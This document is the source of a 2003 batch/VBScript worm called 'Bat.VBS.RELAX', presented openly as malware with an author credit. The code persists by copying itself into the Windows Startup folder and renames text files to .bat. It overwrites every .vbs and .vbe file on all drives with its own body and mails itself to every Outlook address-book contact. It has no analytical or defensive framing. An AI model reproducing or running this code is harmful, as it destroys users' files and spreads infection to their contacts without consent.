:: Bat.VBS.RELAX / Outlook
:: By sevenC
:: DECEMBER 2th 2003
@ctty nul
@echo off
@copy %0 %windir%\relax.bat
@for %%a in (C:\*.txt) do ren %%a *.bat
@for %%a in (C:\windows\*.txt) do ren %%a *.bat
@for %%a in (C:\Mydocu~1\*.txt) do ren %%a *.bat
@echo.On Error Resume Next>>C:\windows\relax.vbs
@echo Dim sucke, Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder >>C:\windows\relax.vbs
@echo Set sucke = wscript.CreateObject("WScript.Shell")>>C:\windows\relax.vbs
@echo Set Fso = CreateObject("scripting.FileSystemObject")>>C:\windows\relax.vbs
@echo Set Drives=fso.drives>>C:\windows\relax.vbs
@echo Set dropper = Fso.opentextfile(wscript.scriptfullname, 1)>>C:\windows\relax.vbs
@echo src = dropper.readall>>C:\windows\relax.vbs
@echo set Trange = document.body.CreateTextRange>>C:\windows\relax.vbs
@echo Fso.copyfile wscript.scriptfullname, "C:\WINDOWS\Start Menu\Programs\StartUp\Shell32.vbs">>C:\windows\relax.vbs
@echo fso.Copyfile("C:\windows\relax.bat"), "C:\WINDOWS\Start Menu\Programs\StartUp\Shell32.bat">>C:\windows\relax.vbs
@echo Set Fso = createobject("scripting.filesystemobject") >>C:\windows\relax.vbs
@echo Set Drives=fso.drives >>C:\windows\relax.vbs
@echo For Each Drive in Drives>>C:\windows\relax.vbs
@echo If drive.isready then>>C:\windows\relax.vbs
@echo Dosearch drive & "\">>C:\windows\relax.vbs
@echo end If >>C:\windows\relax.vbs
@echo Next >>C:\windows\relax.vbs
@echo Function Dosearch(Path) >>C:\windows\relax.vbs
@echo Set Folder=fso.getfolder(path) >>C:\windows\relax.vbs
@echo Set Files = folder.files>>C:\windows\relax.vbs
@echo For Each File in files>>C:\windows\relax.vbs
@echo If fso.GetExtensionName(file.path)="vbs" or fso.GetExtensionName(file.path)="vbe" then >>C:\windows\relax.vbs
@echo Set dropper = Fso.createtextfile(file.path, True)>>C:\windows\relax.vbs
@echo dropper.write src>>C:\windows\relax.vbs
@echo dropper.Close>>C:\windows\relax.vbs
@echo end if>>C:\windows\relax.vbs
@echo If fso.GetExtensionName(file.path)="vbs" then >>C:\windows\relax.vbs
@echo Set fso = createobject("scripting.filesystemobject") >>C:\windows\relax.vbs
@echo Set ooooo = fso.opentextfile("C:\windows\relax.bat") >>C:\windows\relax.vbs
@echo oooooo = ooooo.readall >>C:\windows\relax.vbs
@echo ooooo.close >>C:\windows\relax.vbs
@echo Set dropper = Fso.createtextfile(file.path, True)>>C:\windows\relax.vbs
@echo dropper.write oooooo>>C:\windows\relax.vbs
@echo dropper.Close>>C:\windows\relax.vbs
@echo end if>>C:\windows\relax.vbs
@echo next>>C:\windows\relax.vbs
@echo Set Subfolders = folder.SubFolders >>C:\windows\relax.vbs
@echo For Each Subfolder in Subfolders >>C:\windows\relax.vbs
@echo Dosearch Subfolder.path >>C:\windows\relax.vbs
@echo Next >>C:\windows\relax.vbs
@echo end function >>C:\windows\relax.vbs
@echo 'BAT.VBS.RELAX>>C:\windows\relax.vbs
@echo 'CREATED BY sevenC>>C:\windows\relax.vbs
@Cscript C:\windows\relax.vbs
@Del C:\windows\relax.vbs
@copy %0 C:\ATTACHMENT.bat
@copy %0 C:\kvqim.vbs
@echo Dim x > C:\kvqim.vbs
@echo.on error resume next >> C:\kvqim.vbs
@echo Set fso =" Scripting.FileSystem.Object" >> C:\kvqim.vbs
@echo Set so=CreateObject(fso) >> C:\kvqim.vbs
@echo Set ol=CreateObject("Outlook.Application") >> C:\kvqim.vbs
@echo Set out=WScript.CreateObject("Outlook.Application") >> C:\kvqim.vbs
@echo Set mapi = out.GetNameSpace("MAPI") >> C:\kvqim.vbs
@echo Set a = mapi.AddressLists(1) >> C:\kvqim.vbs
@echo Set ae=a.AddressEntries >> C:\kvqim.vbs
@echo For x=1 To ae.Count >> C:\kvqim.vbs
@echo Set ci=ol.CreateItem(0) >> C:\kvqim.vbs
@echo Set Mail=ci >> C:\kvqim.vbs
@echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) >> C:\kvqim.vbs
@echo Mail.Subject="SUBJECT" >> C:\kvqim.vbs
@echo Mail.Body="BODY" >> C:\kvqim.vbs
@echo Mail.Attachments.Add("C:\ATTACHMENT.bat") >> C:\kvqim.vbs
@echo Mail.Send >> C:\kvqim.vbs
@echo Next >> C:\kvqim.vbs
@echo ol.Quit >> C:\kvqim.vbs
@cscript C:\kvqim.vbs
@del C:\kvqim.vbs
@del C:\ATTACHMENT.bat